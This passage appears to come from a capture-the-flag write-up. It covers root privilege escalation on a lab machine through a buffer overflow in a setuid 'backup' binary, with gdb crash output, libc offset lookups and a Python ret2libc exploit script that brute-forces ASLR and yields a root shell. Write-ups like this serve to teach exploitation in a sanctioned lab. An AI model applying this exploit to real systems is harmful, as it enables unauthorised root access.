ESP: 0xffffc300 --> 0xffffd600 ("d0230167104d474")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffc300 --> 0xffffd600 ("d0230167104d474")
0004| 0xffffc304 --> 0x8049ed0 ("/etc")
0008| 0xffffc308 --> 0x804d570 --> 0xfbad2498
0012| 0xffffc30c --> 0x8048a1b (<main+30>:	sub    esp,0xc)
0016| 0xffffc310 --> 0x0
0020| 0xffffc314 --> 0x0
0024| 0xffffc318 --> 0x0
0028| 0xffffc31c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
```

```sh
root@kali:~# cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

root@kali:~#
```

```sh
tom-4.3$ ldd /usr/local/bin/backup | grep libc.so.6
	libc.so.6 => /lib32/libc.so.6 (0xf7592000)
tom-4.3$ ldd /usr/local/bin/backup | grep libc.so.6
	libc.so.6 => /lib32/libc.so.6 (0xf7553000)
tom-4.3$ ldd /usr/local/bin/backup | grep libc.so.6
	libc.so.6 => /lib32/libc.so.6 (0xf75f7000)
tom-4.3$ ldd /usr/local/bin/backup | grep libc.so.6
	libc.so.6 => /lib32/libc.so.6 (0xf7598000)
tom-4.3$
```

```sh
tom-4.3$ readelf -s /lib32/libc.so.6 | grep system
   245: 00110820    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
tom-4.3$
```

```sh
tom-4.3$ readelf -s /lib32/libc.so.6 | grep exit
   112: 0002eba0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002ebd0   181 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000af578    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00113840    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eb80    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002e9d0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011d290    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b0204     4 OBJECT  GLOBAL DEFAULT   32 argp_err_exit_status@@GLIBC_2.1
  1506: 000f19a0    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b0154     4 OBJECT  GLOBAL DEFAULT   32 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e7d0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f2db0     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
tom-4.3$
```

```sh
tom-4.3$ strings -a -t x /lib32/libc.so.6 | grep bin/sh
 15900b /bin/sh
tom-4.3$
```

`buf.py`

```python
from subprocess import call
import struct

libc_base_addr = 0xf7592000 # ldd /usr/local/bin/backup | grep libc.so.6

system_off = 0x0003a940		# Address of system (readelf -s /lib32/libc.so.6 | grep system)
exit_off = 0x0002e7b0		# Address of exit (readelf -s /lib32/libc.so.6 | grep exit)
arg_off = 0x15900b		# Address of /bin/sh (strings -a -t x /lib32/libc.so.6 | grep bin/sh)

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_off)
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

buf = "A" * 512
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
	print "Try: %s" %i
	i += 1
	ret = call(["/usr/local/bin/backup", "aa", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", buf])
```

```sh
tom-4.3$ cd /dev/shm/
tom-4.3$ vim buf.py
tom-4.3$ chmod 777 buf.py
tom-4.3$ python buf.py
<---------------------------CROP--------------------------------->
Try: 204



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@�\�\�
                                                                                                                                      �n�
# id
uid=0(root) gid=1001(mark) groups=1001(mark)
# cat /root/root.txt
1722e99ca5f353b362556a62bd5e6be0
#
# cd /home
# ls -l
total 12
drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
drwxr-xr-x 3 root root 4096 Jun  4 21:58 mark
drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
# cd tom
# ls
user.txt
# cat user.txt
e1156acc3574e04b06908ecf76be91b1
#
```